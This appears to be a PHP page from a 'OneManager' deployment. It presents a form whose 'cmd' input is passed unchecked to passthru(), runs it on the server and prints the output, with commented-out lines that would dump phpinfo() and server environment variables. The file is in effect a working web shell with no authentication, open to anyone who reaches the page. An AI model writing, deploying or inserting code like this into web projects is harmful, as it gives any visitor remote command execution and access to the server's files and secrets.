<?php
//phpinfo();
//echo "<!--" . json_encode($_SERVER, JSON_PRETTY_PRINT) . "-->";
//echo $_SERVER["ZEABUR_USER_ID"];

$statusCode = 200;
$html .= '
OneManager DIR: ' . __DIR__ . '
<form name="form1" method="POST" action="">
    <input id="inputarea" name="cmd" style="width:100%" value="' . htmlspecialchars($_POST['cmd']) . '" placeholder="ls, pwd, cat"><br>
    <input type="submit" value="post">
</form>';
        if ($_POST['cmd'] != '') {
            $html .= '
<pre>';
            @ob_start();
            passthru($_POST['cmd'], $cmdstat);
            $html .= '
stat: ' . $cmdstat . '
output:

';
            if ($cmdstat > 0) $statusCode = 400;
            if ($cmdstat === 1) $statusCode = 403;
            if ($cmdstat === 127) $statusCode = 404;
            $html .= htmlspecialchars(ob_get_clean());
            $html .= '</pre>';
        }
        $html .= '
<script>
    setTimeout(function () {
        let inputarea = document.getElementById(\'inputarea\');
        //console.log(a + ", " + inputarea.value);
        inputarea.focus();
        inputarea.setSelectionRange(inputarea.value.length, inputarea.value.length);
    }, 500);
</script>';
http_response_code($statusCode);
echo $html;
